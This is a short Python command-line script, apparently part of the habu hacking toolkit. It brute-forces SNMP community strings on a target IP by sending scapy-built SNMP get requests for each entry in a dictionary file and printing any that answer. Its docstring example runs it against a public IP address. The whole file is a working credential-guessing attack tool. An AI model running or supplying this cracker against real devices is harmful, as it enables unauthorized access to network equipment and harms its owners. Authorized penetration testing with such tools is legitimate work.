#!/usr/bin/env python3

import logging
import os
import sys
from pathlib import Path

import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import ASN1_OID, IP, SNMP, UDP, SNMPget, SNMPvarbind, conf, sr1


@click.command()
@click.argument('ip')
@click.option('-p', 'port', default=161, help='Port to use')
@click.option('-s', 'stop', is_flag=True, default=False, help='Stop after first match')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_crack_snmp(ip, port, stop, verbose):
    """Launches snmp-get queries against an IP, and tells you when
    finds a valid community string (is a simple SNMP cracker).

    The dictionary used is the distributed with the onesixtyone tool
    https://github.com/trailofbits/onesixtyone

    Example:

    \b
    # habu.crack.snmp 179.125.234.210
    Community found: private
    Community found: public

    Note: You can also receive messages like \<UNIVERSAL\> \<class
    'scapy.asn1.asn1.ASN1\_Class\_metaclass'\>, I don't know how to supress
    them for now.
    """

    FILEDIR = os.path.dirname(os.path.abspath(__file__))
    DATADIR = os.path.abspath(os.path.join(FILEDIR, '../data'))
    COMMFILE = Path(os.path.abspath(os.path.join(DATADIR, 'dict_snmp.txt')))

    with COMMFILE.open() as cf:
        communities = cf.read().split('\n')

    conf.verb = False

    pkt = IP(dst=ip)/UDP(sport=port, dport=port)/SNMP(community="public", PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1"))]))

    for community in communities:

        if verbose:
            print('.', end='')
            sys.stdout.flush()

        pkt[SNMP].community=community
        ans = sr1(pkt, timeout=0.5, verbose=0)

        if ans and UDP in ans:
            print('\nCommunity found:', community)
            if stop:
                break

    return True

if __name__ == '__main__':
    cmd_crack_snmp()
